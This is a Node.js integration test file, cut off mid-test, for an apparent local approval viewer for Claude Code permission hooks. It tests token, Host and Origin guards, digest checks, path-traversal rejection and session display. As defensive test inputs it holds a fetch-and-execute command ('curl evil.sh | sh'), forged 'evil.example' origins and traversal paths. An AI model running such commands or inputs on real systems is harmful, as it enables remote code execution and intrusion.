'use strict';

// Spawns the real hook and server against a throwaway HOME, so it never
// touches ~/.zoo. Run with:  npm run test:integration
// ZOO_HOOK=bin/zoo-hook.next.js tests a hook before it is swapped in.
// ZOO_SERVE_BIN=src-tauri/target/release/zoo runs the same suite against the menu
// bar app's Rust server (npm run test:integration:app).

const test = require('node:test');
const assert = require('node:assert/strict');
const { spawn } = require('child_process');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { requestDigest } = require('../lib/permission');

const ROOT = path.join(__dirname, '..');
const HOOK = path.join(ROOT, process.env.ZOO_HOOK || 'bin/zoo-hook.js');
const SERVE = path.join(ROOT, 'bin/zoo-serve.js');
const SERVE_BIN = process.env.ZOO_SERVE_BIN ? path.resolve(ROOT, process.env.ZOO_SERVE_BIN) : null;
// Ask the OS for a free port: a fixed random range kept landing on other local
// servers (JARVIS listens on 4848).
const freePort = () => Number(require('child_process').execFileSync(process.execPath, ['-e',
  "const s = require('net').createServer().listen(0, '127.0.0.1', () => { console.log(s.address().port); s.close(); })"]));
const PORT = freePort();
const BASE = `http://127.0.0.1:${PORT}`;

let home;
let zoo;
let server;
let token;
let counter = 0;
const liveHooks = new Set();
const fakeClients = new Set();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function writeConfig() {
  fs.writeFileSync(path.join(zoo, 'config.json'), JSON.stringify({
    stale_hours: 6,
    unread_after_seconds: 60,
    approve_timeout_seconds: 5,
    viewer_heartbeat_seconds: 2,
    linger_max_seconds: 4,
    matcher_scope: { enabled_tools: ['Bash', 'Write', 'Edit', 'MultiEdit'] },
  }), { mode: 0o700 });
}

function startServer(port) {
  const [cmd, args] = SERVE_BIN ? [SERVE_BIN, ['--serve-only']] : [process.execPath, [SERVE]];
  // ZOO_JUMP_DRY_RUN: /jump reports what it would open instead of opening windows.
  const child = spawn(cmd, args, { env: { ...process.env, HOME: home, ZOO_PORT: String(port), ZOO_JUMP_DRY_RUN: '1' } });
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (d) => { stdout += d; });
  child.stderr.on('data', (d) => { stderr += d; });
  const exited = new Promise((resolve) => child.on('close', (code) => resolve({ code, stdout, stderr })));
  const ready = new Promise((resolve, reject) => {
    child.stdout.on('data', () => { if (stdout.includes('zoo viewer at')) resolve(); });
    exited.then((r) => reject(new Error(`server exited ${r.code}: ${r.stderr}`)));
  });
  return { child, ready, exited };
}

// Stands in for a Claude Code process: something with a pid that can die.
function startFakeClient() {
  const child = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 60000)']);
  fakeClients.add(child);
  const exited = new Promise((resolve) => child.on('exit', resolve));
  return {
    pid: child.pid,
    kill: async () => {
      child.kill('SIGKILL');
      await exited;
      fakeClients.delete(child);
    },
  };
}

// client mirrors CLAUDE_CODE_ENTRYPOINT: 'cli' is an interactive terminal, and
// 'sdk-cli' or nothing is a headless run. The hook only lingers for interactive ones.
// clientPid mirrors CLAUDE_PID, the Claude Code process behind the session.
function startHook(payload, { raw, client = 'cli', projectDir, clientPid } = {}) {
  const env = { ...process.env, HOME: home, CLAUDE_CODE_ENTRYPOINT: client };
  delete env.CLAUDE_PROJECT_DIR;
  delete env.CLAUDE_PID;
  if (projectDir) env.CLAUDE_PROJECT_DIR = projectDir;
  if (clientPid) env.CLAUDE_PID = String(clientPid);
  const started = Date.now();
  const child = spawn(process.execPath, [HOOK], { env });
  liveHooks.add(child);
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (d) => { stdout += d; });
  child.stderr.on('data', (d) => { stderr += d; });
  const result = new Promise((resolve) => {
    child.on('close', (code, signal) => {
      liveHooks.delete(child);
      resolve({ code, signal, stdout, stderr, ms: Date.now() - started });
    });
  });
  child.stdin.end(raw !== undefined ? raw : JSON.stringify(payload));
  return { child, result };
}

const runHook = (payload, opts) => startHook(payload, opts).result;

// What Claude Code does the moment its own prompt is answered in the terminal.
function answeredInTerminal(hook) {
  hook.child.kill('SIGTERM');
  return hook.result;
}

function raw(method, pathname, { headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { host: '127.0.0.1', port: PORT, method, path: pathname, headers: { Host: `127.0.0.1:${PORT}`, ...headers } },
      (res) => {
        let data = '';
        res.on('data', (c) => { data += c; });
        res.on('end', () => {
          let json = null;
          try { json = JSON.parse(data); } catch { /* not JSON */ }
          resolve({ status: res.statusCode, headers: res.headers, text: data, json });
        });
      },
    );
    req.on('error', reject);
    if (body !== undefined) req.write(body);
    req.end();
  });
}

const authed = (method, pathname, opts = {}) =>
  raw(method, pathname, { ...opts, headers: { 'X-Zoo-Token': token, ...(opts.headers || {}) } });

function postDecision(body, headers = {}) {
  return authed('POST', '/decision', {
    headers: { 'Content-Type': 'application/json', Origin: BASE, ...headers },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
}

const heartbeat = () => authed('GET', '/state');
const noViewer = () => fs.rmSync(path.join(zoo, 'viewer-heartbeat'), { force: true });

async function withHeartbeat(fn) {
  await heartbeat();
  const timer = setInterval(() => { heartbeat().catch(() => {}); }, 400);
  try {
    return await fn();
  } finally {
    clearInterval(timer);
  }
}

async function waitFor(fn, timeoutMs = 5000) {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = await fn();
    if (value) return value;
    if (Date.now() > deadline) throw new Error('timed out waiting');
    await sleep(50);
  }
}

const pendingRequest = (sessionId) =>
  waitFor(async () => ((await authed('GET', '/requests')).json || []).find((r) => r.session_id === sessionId));

async function newSession(opts = {}) {
  const id = `it-${process.pid}-${++counter}`;
  const base = { session_id: id, transcript_path: '/tmp/x.jsonl', cwd: `/tmp/zoo-it/${id}`, permission_mode: 'default' };
  await runHook({ ...base, hook_event_name: 'SessionStart', source: 'startup' }, opts);
  await runHook({ ...base, hook_event_name: 'UserPromptSubmit', prompt: 'test' }, opts);
  return {
    id,
    base,
    permission: (toolName, toolInput) => ({
      ...base, hook_event_name: 'PermissionRequest', tool_name: toolName, tool_input: toolInput, permission_suggestions: [],
    }),
  };
}

const readSession = (id) => JSON.parse(fs.readFileSync(path.join(zoo, 'sessions', `${id}.json`), 'utf8'));
const listDir = (name) => fs.readdirSync(path.join(zoo, name));

function eventsFor(sessionId) {
  return fs.readFileSync(path.join(zoo, 'events.jsonl'), 'utf8').trim().split('\n')
    .map((line) => JSON.parse(line))
    .filter((e) => e.session_id === sessionId);
}

const decisionsFor = (sessionId) => eventsFor(sessionId).filter((e) => e.event === 'ZooDecision').map((e) => e.data);
const outcomes = (sessionId) => decisionsFor(sessionId).map((d) => d.outcome);
const waitForOutcome = (sessionId, outcome) => waitFor(() => outcomes(sessionId).includes(outcome));
const visibleIds = async () => (await authed('GET', '/state')).json.map((s) => s.session_id);

test.before(async () => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'zoo-it-'));
  zoo = path.join(home, '.zoo');
  for (const d of ['', 'sessions', 'archive', 'requests', 'decisions']) {
    fs.mkdirSync(path.join(zoo, d), { recursive: true, mode: 0o700 });
  }
  writeConfig();
  server = startServer(PORT);
  await server.ready;
  const page = await raw('GET', '/');
  token = (page.text.match(/name="zoo-token" content="([0-9a-f]{64})"/) || [])[1];
  assert.ok(token, 'page should embed a 64-hex-char token');
});

test.after(() => {
  for (const child of liveHooks) child.kill('SIGKILL');
  for (const child of fakeClients) child.kill('SIGKILL');
  if (server) server.child.kill();
  fs.rmSync(home, { recursive: true, force: true });
});

test('server: page is unframeable, API needs the right Host and token', async () => {
  const page = await raw('GET', '/');
  assert.match(page.headers['content-security-policy'], /frame-ancestors 'none'/);
  assert.equal(page.headers['x-frame-options'], 'DENY');
  assert.equal((await raw('GET', '/state', { headers: { Host: `evil.example:${PORT}`, 'X-Zoo-Token': token } })).status, 403);
  assert.equal((await raw('GET', '/state')).status, 403);
  assert.equal((await raw('GET', '/requests', { headers: { 'X-Zoo-Token': 'f'.repeat(64) } })).status, 403);
  assert.equal((await authed('GET', '/state')).status, 200);
});

test('server: monster poses load without the token, and nothing else under ui/ does', async () => {
  assert.match((await raw('GET', '/')).headers['content-security-policy'], /img-src 'self'/);
  const png = await raw('GET', '/monsters/scarf/blocked.png');
  assert.equal(png.status, 200);
  assert.equal(png.headers['content-type'], 'image/png');
  assert.equal(png.headers['x-content-type-options'], 'nosniff');
  assert.equal((await raw('GET', '/monsters/scarf/blocked.png', { headers: { Host: `evil.example:${PORT}` } })).status, 403);
  assert.equal((await raw('GET', '/monsters/nope/blocked.png')).status, 404);
  for (const colorway of ['indigo', 'violet', 'rose']) {
    assert.equal((await raw('GET', `/monsters/scarf/sleeping_${colorway}.png`)).status, 200, colorway);
  }
  assert.equal((await raw('GET', '/monsters/scarf/sleeping_teal.png')).status, 404, 'teal has no suffix');
  for (const p of [
    '/monsters/scarf/SPEC.md',
    '/monsters/scarf/rig-reference.html',
    '/monsters/scarf/other.png',
    '/monsters/scarf/blocked_Rose.png',
    '/monsters/scarf/blocked_rose.png.bak',
    '/monsters/scarf/blocked_../../SPEC.md',
    '/monsters/scarf/../../index.html',
    '/monsters/%2e%2e/%2e%2e/bin/zoo-serve.js',
    '/index.html',
  ]) {
    assert.equal((await raw('GET', p)).status, 403, p);
    assert.equal((await authed('GET', p)).status, 404, p);
  }
});

test('hook: malformed stdin exits 0 with nothing on stdout', async () => {
  const r = await runHook(null, { raw: 'not json' });
  assert.equal(r.code, 0);
  assert.equal(r.stdout, '');
});

test('no viewer: no card, and the zoo learns when the terminal prompt is answered', async () => {
  noViewer();
  const s = await newSession();
  const hook = startHook(s.permission('Bash', { command: 'ls' }));
  await waitForOutcome(s.id, 'no_viewer');
  assert.deepEqual(listDir('requests'), []);
  assert.equal(readSession(s.id).state, 'blocked');

  const r = await answeredInTerminal(hook);
  assert.equal(r.code, 0);
  assert.equal(r.stdout, '');
  assert.deepEqual(outcomes(s.id), ['no_viewer', 'cancelled']);
  assert.equal(readSession(s.id).state, 'working');
});

test('headless or unknown clients never linger', async () => {
  for (const client of ['sdk-cli', '']) {
    noViewer();
    const s = await newSession();
    const r = await runHook(s.permission('Bash', { command: 'ls' }), { client });
    assert.equal(r.stdout, '');
    assert.ok(r.ms < 2000, `${client || 'no client'} took ${r.ms}ms`);
    assert.deepEqual(outcomes(s.id), ['no_viewer']);
  }
});

test("lingering gives up on its own before Claude Code's timeout, leaving the session blocked", async () => {
  noViewer();
  const s = await newSession();
  const r = await runHook(s.permission('Bash', { command: 'ls' }));
  assert.equal(r.stdout, '');
  assert.ok(r.ms >= 4000 && r.ms < 7000, `took ${r.ms}ms, expected ~4000`);
  assert.deepEqual(outcomes(s.id), ['no_viewer', 'gave_up']);
  assert.equal(readSession(s.id).state, 'blocked');
});

test('lingering stops once another event moves the session on', async () => {
  noViewer();
  const s = await newSession();
  const hook = startHook(s.permission('Bash', { command: 'ls' }));
  await waitForOutcome(s.id, 'no_viewer');
  await runHook({ ...s.base, hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } });
  const r = await hook.result;
  assert.equal(r.stdout, '');
  assert.deepEqual(outcomes(s.id), ['no_viewer'], 'left early, without giving up');
  assert.equal(readSession(s.id).state, 'working');
});

test('allow from the viewer: hook prints the allow decision and cleans up', async () => {
  const s = await newSession();
  const input = { command: 'rm -rf build/ && echo "done"', description: 'Clean' };
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', input));
    const req = await pendingRequest(s.id);
    assert.equal(req.mode, 'awaiting');
    assert.equal(req.allow_enabled, true);
    assert.equal(req.digest, requestDigest('Bash', input));
    assert.deepEqual(req.tool_input, input);
    assert.equal(readSession(s.id).pending_request, req.request_id);

    const posted = await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'allow' });
    assert.equal(posted.status, 200, posted.text);

    const r = await hook.result;
    assert.equal(r.code, 0);
    assert.deepEqual(JSON.parse(r.stdout), {
      hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } },
    });
  });
  assert.deepEqual(listDir('requests'), []);
  assert.deepEqual(listDir('decisions'), []);
  assert.deepEqual(outcomes(s.id), ['allow']);
  const session = readSession(s.id);
  assert.equal(session.state, 'working');
  assert.equal(session.pending_request, null);
});

test('deny from the viewer carries the reason to Claude', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Write', { file_path: '/tmp/x', content: 'hi' }));
    const req = await pendingRequest(s.id);
    const reason = 'Use the Makefile target instead.';
    assert.equal((await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'deny', reason })).status, 200);
    const out = JSON.parse((await hook.result).stdout);
    assert.deepEqual(out.hookSpecificOutput.decision, { behavior: 'deny', message: reason });
  });
  assert.equal(readSession(s.id).state, 'working');
});

test('answer in terminal: the card closes at once and the hook waits for the terminal answer', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', { command: 'make deploy' }));
    const req = await pendingRequest(s.id);
    const sentAt = Date.now();
    assert.equal((await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'defer' })).status, 200);
    await waitForOutcome(s.id, 'defer');
    assert.ok(Date.now() - sentAt < 1500, 'defer should land within a poll or two');
    await waitFor(() => listDir('requests').length === 0);
    assert.equal(readSession(s.id).state, 'blocked', 'the terminal prompt is still open');

    const r = await answeredInTerminal(hook);
    assert.equal(r.stdout, '');
  });
  assert.deepEqual(outcomes(s.id), ['defer', 'cancelled']);
  assert.equal(readSession(s.id).state, 'working');
});

test('timeout: nothing is approved, and the hook lingers until it gives up', async () => {
  const s = await newSession();
  const r = await withHeartbeat(() => runHook(s.permission('Bash', { command: 'sleep 1' })));
  assert.equal(r.code, 0);
  assert.equal(r.stdout, '');
  assert.ok(r.ms >= 9000 && r.ms < 12000, `took ${r.ms}ms, expected ~9000 (5s window + 4s linger)`);
  assert.deepEqual(outcomes(s.id), ['timeout', 'gave_up']);
  assert.deepEqual(listDir('requests'), []);
  assert.equal(readSession(s.id).state, 'blocked');
});

test('closing the viewer mid-wait releases the card early', async () => {
  const s = await newSession();
  await heartbeat();
  const hook = startHook(s.permission('Bash', { command: 'ls' }));
  await waitForOutcome(s.id, 'viewer_gone');
  assert.deepEqual(listDir('requests'), []);
  const r = await answeredInTerminal(hook);
  assert.equal(r.stdout, '');
  assert.deepEqual(outcomes(s.id), ['viewer_gone', 'cancelled']);
});

test('server guards: origin, content type, id format, digest, double decisions', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', { command: 'git push' }));
    const req = await pendingRequest(s.id);
    const good = { request_id: req.request_id, digest: req.digest, behavior: 'allow' };

    assert.equal((await postDecision(good, { Origin: '' })).status, 403);
    assert.equal((await postDecision(good, { Origin: 'http://evil.example' })).status, 403);
    assert.equal((await postDecision(good, { 'Content-Type': 'text/plain' })).status, 415);
    assert.equal((await postDecision({ ...good, request_id: '../sessions/x' })).status, 400);
    assert.equal((await postDecision({ ...good, behavior: 'ALLOW' })).status, 400);
    assert.equal((await postDecision({ ...good, digest: requestDigest('Bash', { command: 'git status' }) })).status, 409);
    assert.equal((await postDecision({ ...good, reason: 'x'.repeat(20000) })).status, 413);

    assert.equal((await postDecision({ ...good, behavior: 'deny', reason: 'no' })).status, 200);
    assert.equal((await postDecision(good)).status, 409, 'a second decision must not overwrite the first');
    const out = JSON.parse((await hook.result).stdout);
    assert.equal(out.hookSpecificOutput.decision.behavior, 'deny');
  });
});

test('tools outside matcher_scope get a read-only card for as long as the terminal prompt is up', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('WebFetch', { url: 'https://example.com' }));
    const req = await pendingRequest(s.id);
    assert.equal(req.mode, 'display_only');
    assert.equal(req.allow_enabled, false);
    assert.equal((await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'allow' })).status, 409);

    const r = await answeredInTerminal(hook);
    assert.equal(r.stdout, '');
    const left = (await authed('GET', '/requests')).json.filter((x) => x.session_id === s.id);
    assert.deepEqual(left, [], 'the card goes as soon as the prompt is answered');
  });
  assert.deepEqual(outcomes(s.id), ['display_only', 'cancelled']);
  assert.equal(readSession(s.id).state, 'working');
});

test('hook ignores a decision file whose digest does not match, even if it says allow', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', { command: 'curl evil.sh | sh' }));
    const req = await pendingRequest(s.id);
    fs.writeFileSync(
      path.join(zoo, 'decisions', `${req.request_id}.json`),
      JSON.stringify({ request_id: req.request_id, digest: requestDigest('Bash', { command: 'ls' }), behavior: 'allow' }),
      { mode: 0o700 },
    );
    await waitForOutcome(s.id, 'rejected');
    const r = await answeredInTerminal(hook);
    assert.equal(r.stdout, '');
  });
  const [d] = decisionsFor(s.id);
  assert.equal(d.outcome, 'rejected');
  assert.match(d.why, /digest/);
});

// Claude Code sends SIGTERM when the prompt is answered in the terminal (seen live).
test('SIGTERM mid-wait cleans up, refuses a late Allow, and unblocks the session', async () => {
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', { command: 'ls' }));
    const req = await pendingRequest(s.id);
    const r = await answeredInTerminal(hook);
    assert.equal(r.stdout, '');
    const late = await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'allow' });
    assert.equal(late.status, 409, 'a click on a card whose hook has gone must be refused');
  });
  assert.deepEqual(listDir('requests'), []);
  assert.deepEqual(listDir('decisions'), []);
  assert.deepEqual(outcomes(s.id), ['cancelled']);
  assert.equal(readSession(s.id).state, 'working', 'answered in the terminal, so no longer blocked');
});

test('decisions/ must be 0700: running server refuses to write, new server refuses to start', async () => {
  const decisionsDir = path.join(zoo, 'decisions');
  const s = await newSession();
  await withHeartbeat(async () => {
    const hook = startHook(s.permission('Bash', { command: 'ls' }));
    const req = await pendingRequest(s.id);
    fs.chmodSync(decisionsDir, 0o755);
    try {
      const refused = await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'allow' });
      assert.equal(refused.status, 500);
      assert.match(refused.json.error, /mode 755/);

      const second = startServer(freePort());
      second.ready.catch(() => {}); // exiting instead of becoming ready is the point
      const exit = await second.exited;
      assert.equal(exit.code, 1);
      assert.match(exit.stderr, /refusing to start/);
    } finally {
      fs.chmodSync(decisionsDir, 0o700);
    }
    assert.equal((await postDecision({ request_id: req.request_id, digest: req.digest, behavior: 'defer' })).status, 200);
    await waitForOutcome(s.id, 'defer');
    assert.equal((await answeredInTerminal(hook)).stdout, '');
  });
});

test('CLAUDE_PROJECT_DIR fixes the session name even when events come from a subfolder', async () => {
  const id = `it-${process.pid}-${++counter}`;
  const base = { session_id: id, transcript_path: '/tmp/x.jsonl', permission_mode: 'default' };
  const projectDir = '/tmp/zoo-it/proj';
  await runHook({ ...base, cwd: `${projectDir}/src`, hook_event_name: 'SessionStart', source: 'startup' }, { projectDir });
  await runHook({ ...base, cwd: `${projectDir}/src/deep`, hook_event_name: 'UserPromptSubmit', prompt: 'x' }, { projectDir });
  const s = readSession(id);
  assert.equal(s.project_dir, projectDir);
  assert.equal(s.name, 'proj');
  assert.equal(s.client, 'cli');
  assert.equal(s.cwd, `${projectDir}/src/deep`);
});

test('the viewer shows a session unread once it has been done for a minute', async () => {
  const id = `it-${process.pid}-${++counter}`;
  const since = new Date(Date.now() - 2 * 60 * 1000).toISOString();
  fs.writeFileSync(
    path.join(zoo, 'sessions', `${id}.json`),
    JSON.stringify({ session_id: id, name: 'x', state: 'done', since, updated_at: since }),
    { mode: 0o700 },
  );
  const s = (await authed('GET', '/state')).json.find((x) => x.session_id === id);
  assert.equal(s.state, 'unread');
});

test('a session whose Claude Code process dies is hidden at once and archived by the next hook', async () => {
  const fake = startFakeClient();
  const s = await newSession({ clientPid: fake.pid });
  assert.equal(readSession(s.id).client_pid, fake.pid);
  assert.ok((await visibleIds()).includes(s.id));

  await fake.kill();
  assert.ok(!(await visibleIds()).includes(s.id), 'hidden as soon as the process is gone');

  await newSession(); // any hook run sweeps
  assert.ok(!fs.existsSync(path.join(zoo, 'sessions', `${s.id}.json`)));
  const archived = JSON.parse(fs.readFileSync(path.join(zoo, 'archive', `${s.id}.json`), 'utf8'));
  assert.equal(archived.state, 'gone');
  assert.deepEqual(eventsFor(s.id).map((e) => e.event), ['SessionStart', 'UserPromptSubmit', 'ZooSessionGone']);
});

test('a lingering hook stops as soon as its Claude Code process dies', async () => {
  noViewer();
  const fake = startFakeClient();
  const s = await newSession({ clientPid: fake.pid });
  const hook = startHook(s.permission('Bash', { command: 'ls' }), { clientPid: fake.pid });
  await waitForOutcome(s.id, 'no_viewer');
  await fake.kill();
  const r = await hook.result;
  assert.equal(r.stdout, '');
  assert.deepEqual(outcomes(s.id), ['no_viewer'], 'neither cancelled nor gave_up: the session is simply over');
});

test('sessions with no recorded process are left alone', async () => {
  const s = await newSession();
  assert.equal(readSession(s.id).client_pid, null);
  await newSession();
  assert.ok(fs.existsSync(path.join(zoo, 'sessions', `${s.id}.json`)));
  assert.ok((await visibleIds()).includes(s.id));
});

test('clicking a finished monster marks that turn seen: unread clears, the next turn goes unread again', async () => {
  const s = await newSession();
  await runHook({ ...s.base, hook_event_name: 'Stop', last_assistant_message: 'finished' });
  const finishedAt = readSession(s.id).finished_at;
  assert.ok(finishedAt, 'Stop records when the turn ended');

  // Age the turn past the unread delay, as if a couple of minutes had gone by.
  const aged = new Date(Date.now() - 2 * 60 * 1000).toISOString();
  const file = path.join(zoo, 'sessions', `${s.id}.json`);
  fs.writeFileSync(file, JSON.stringify({ ...readSession(s.id), since: aged, finished_at: aged }), { mode: 0o700 });
  const stateOf = async () => (await authed('GET', '/state')).json.find((x) => x.session_id === s.id);
  assert.equal((await stateOf()).state, 'unread');

  const post = (body, headers = {}) => authed('POST', '/seen', {
    headers: { 'Content-Type': 'application/json', Origin: BASE, ...headers },
    body: JSON.stringify(body),
  });
  const good = { session_id: s.id, finished_at: aged };
  assert.equal((await post(good, { Origin: 'http://evil.example' })).status, 403);
  assert.equal((await raw('POST', '/seen', { headers: { 'Content-Type': 'application/json', Origin: BASE }, body: JSON.stringify(good) })).status, 403);
  assert.equal((await post({ session_id: '../sessions/x', finished_at: aged })).status, 400);
  assert.equal((await post({ session_id: s.id, finished_at: finishedAt })).status, 409, 'a turn the page did not show');
  assert.equal((await stateOf()).state, 'unread');

  assert.equal((await post(good)).status, 200);
  assert.equal((await stateOf()).state, 'done');
  assert.ok(fs.existsSync(path.join(zoo, 'seen', `${s.id}.json`)));
  assert.deepEqual(eventsFor(s.id).filter((e) => e.event === 'ZooSeen').map((e) => e.data), [{ finished_at: aged, was: 'unread' }]);

  // The next turn ends, ages, and goes unread despite the old mark.
  await runHook({ ...s.base, hook_event_name: 'UserPromptSubmit', prompt: 'again' });
  assert.equal((await post(good)).status, 409, 'the session has moved on');
  await runHook({ ...s.base, hook_event_name: 'Stop', last_assistant_message: 'finished again' });
  const later = new Date(Date.now() - 90 * 1000).toISOString();
  fs.writeFileSync(file, JSON.stringify({ ...readSession(s.id), since: later, finished_at: later }), { mode: 0o700 });
  assert.equal((await stateOf()).state, 'unread');

  // Once the session is gone, its mark is cleared the next time anything is marked.
  await runHook({ ...s.base, hook_event_name: 'SessionEnd', reason: 'exit' });
  const other = await newSession();
  await runHook({ ...other.base, hook_event_name: 'Stop', last_assistant_message: 'x' });
  assert.equal((await post({ session_id: other.id, finished_at: readSession(other.id).finished_at })).status, 200);
  assert.ok(!fs.existsSync(path.join(zoo, 'seen', `${s.id}.json`)));
});

test('a session opened and never prompted leaves the viewer after ten minutes, and returns on its first prompt', async () => {
  const id = `it-${process.pid}-${++counter}`;
  const base = { session_id: id, transcript_path: '/tmp/x.jsonl', cwd: `/tmp/zoo-it/${id}`, permission_mode: 'default' };
  await runHook({ ...base, hook_event_name: 'SessionStart', source: 'startup' });
  assert.ok((await visibleIds()).includes(id), 'shown while freshly opened');

  const file = path.join(zoo, 'sessions', `${id}.json`);
  const age = (minutes) => {
    const t = new Date(Date.now() - minutes * 60 * 1000).toISOString();
    fs.writeFileSync(file, JSON.stringify({ ...readSession(id), since: t, updated_at: t }), { mode: 0o700 });
  };
  age(9);
  assert.ok((await visibleIds()).includes(id), 'still shown at nine minutes');
  age(11);
  assert.ok(!(await visibleIds()).includes(id), 'gone at eleven');
  age(7 * 60);
  assert.ok(!(await visibleIds()).includes(id), 'and does not come back as a sleeping monster');

  await runHook({ ...base, hook_event_name: 'UserPromptSubmit', prompt: 'hello' });
  const back = (await authed('GET', '/state')).json.find((s) => s.session_id === id);
  assert.equal(back && back.state, 'working');
});

test('sessions running at the same time get different colours, kept for their life', async () => {
  for (const f of fs.readdirSync(path.join(zoo, 'sessions'))) fs.rmSync(path.join(zoo, 'sessions', f));
  // A session from before colours were stored shows its monster_seed colour (00 -> teal),
  // and that colour counts as taken.
  fs.writeFileSync(path.join(zoo, 'sessions', 'old.json'), JSON.stringify({
    session_id: 'old', name: 'old', state: 'working', since: new Date().toISOString(),
    updated_at: new Date().toISOString(), monster_seed: '00' + 'a'.repeat(38),
  }), { mode: 0o700 });
  const made = [];
  for (let i = 0; i < 3; i += 1) made.push(await newSession());
  const colours = made.map((s) => readSession(s.id).colorway);
  assert.deepEqual([...colours].sort(), ['indigo', 'rose', 'violet'], 'the three free colours, teal being taken');

  // All four taken: the next one still gets a valid colour.
  const fifth = await newSession();
  assert.ok(['teal', 'indigo', 'violet', 'rose'].includes(readSession(fifth.id).colorway));

  // Later events, including a stop and a new prompt, don't change it.
  await runHook({ ...made[0].base, hook_event_name: 'Stop', last_assistant_message: 'x' });
  await runHook({ ...made[0].base, hook_event_name: 'UserPromptSubmit', prompt: 'again' });
  assert.equal(readSession(made[0].id).colorway, colours[0]);
  fs.rmSync(path.join(zoo, 'sessions', 'old.json'));
});

test('hidden sessions do not hold a colour: only the ones the zoo shows count', async () => {
  for (const f of fs.readdirSync(path.join(zoo, 'sessions'))) fs.rmSync(path.join(zoo, 'sessions', f));
  const now = new Date().toISOString();
  const long = new Date(Date.now() - 30 * 60 * 1000).toISOString();
  const put = (id, s) => fs.writeFileSync(path.join(zoo, 'sessions', `${id}.json`), JSON.stringify({ session_id: id, name: id, ...s }), { mode: 0o700 });
  // Shown: a working session in teal.
  put('shown', { state: 'working', colorway: 'teal', since: now, updated_at: now });
  // Hidden: opened and never used for half an hour, and a stale one that was only ever opened.
  put('unused', { state: 'spawned', colorway: 'indigo', since: long, updated_at: long });
  put('stale-unused', { state: 'stale', stale_from: 'spawned', colorway: 'violet', since: long, updated_at: long });
  const made = [];
  for (let i = 0; i < 3; i += 1) made.push(await newSession());
  const colours = made.map((s) => readSession(s.id).colorway).sort();
  assert.deepEqual(colours, ['indigo', 'rose', 'violet'], 'every colour but the shown session\'s teal is free');
});

test("sessions with no prompt yet, like the desktop app's companions, do not hold a colour", async () => {
  for (const f of fs.readdirSync(path.join(zoo, 'sessions'))) fs.rmSync(path.join(zoo, 'sessions', f));
  const now = new Date().toISOString();
  const put = (id, s) => fs.writeFileSync(path.join(zoo, 'sessions', `${id}.json`), JSON.stringify({ session_id: id, name: id, since: now, updated_at: now, ...s }), { mode: 0o700 });
  put('working', { state: 'working', colorway: 'teal' });
  put('companion', { state: 'spawned', colorway: 'rose', last_message: null });
  put('resumed', { state: 'spawned', colorway: 'violet', last_message: 'finished an earlier turn' });
  const a = await newSession();
  const b = await newSession();
  const got = [readSession(a.id).colorway, readSession(b.id).colorway].sort();
  assert.deepEqual(got, ['indigo', 'rose'], "the companion's rose is free; the resumed chat's violet and teal are not");
});

test('jump: a desktop session opens by its Claude app id; other sessions are refused plainly', async () => {
  const post = (body, headers = {}) => authed('POST', '/jump', {
    headers: { 'Content-Type': 'application/json', Origin: BASE, ...headers },
    body: JSON.stringify(body),
  });
  const s = await newSession();
  const dir = path.join(home, 'Library', 'Application Support', 'Claude', 'claude-code-sessions', 'acct', 'org');
  fs.mkdirSync(dir, { recursive: true });
  const record = (archived) => fs.writeFileSync(path.join(dir, 'local_zoo-test-1.json'),
    JSON.stringify({ sessionId: 'local_zoo-test-1', cliSessionId: s.id, isArchived: archived }));

  record(false);
  const ok = await post({ session_id: s.id });
  assert.equal(ok.status, 200);
  assert.deepEqual(ok.json.dry_run, { kind: 'desktop', url: 'claude://code/continue?session=local_zoo-test-1' });
  record(true);
  assert.equal((await post({ session_id: s.id })).status, 409, 'archived in the Claude app');
  fs.rmSync(path.join(home, 'Library'), { recursive: true, force: true });

  // Not a desktop session, and its process has no terminal: nothing to open.
  const client = startFakeClient();
  const t = await newSession({ clientPid: client.pid });
  const none = await post({ session_id: t.id });
  assert.equal(none.status, 409);
  assert.match(none.json.error, /no window/);
  await client.kill();
  assert.match((await post({ session_id: t.id })).json.error, /exited|no such session/);

  assert.equal((await post({ session_id: s.id }, { Origin: 'http://evil.example' })).status, 403);
  assert.equal((await raw('POST', '/jump', { headers: { 'Content-Type': 'application/json', Origin: BASE }, body: JSON.stringify({ session_id: s.id }) })).status, 403);
  assert.equal((await post({ session_id: '../sessions/x' })).status, 400);
  assert.equal((await post({ session_id: 'no-such-session' })).status, 404);
});

test('jump: a Cowork session opens by the waiting link while blocked, the app otherwise', async () => {
  const post = (body) => authed('POST', '/jump', {
    headers: { 'Content-Type': 'application/json', Origin: BASE },
    body: JSON.stringify(body),
  });
  const id = `cowork-it-${process.pid}`;
  const now = new Date().toISOString();
  const file = path.join(zoo, 'sessions', `${id}.json`);
  const put = (state) => fs.writeFileSync(file, JSON.stringify({ session_id: id, vendor: 'claude-cowork', client: 'cowork', client_pid: null, name: 'Cowork task', state, since: now, updated_at: now }), { mode: 0o700 });
  const dir = path.join(home, 'Library', 'Application Support', 'Claude', 'local-agent-mode-sessions', 'acct', 'org');
  fs.mkdirSync(dir, { recursive: true });
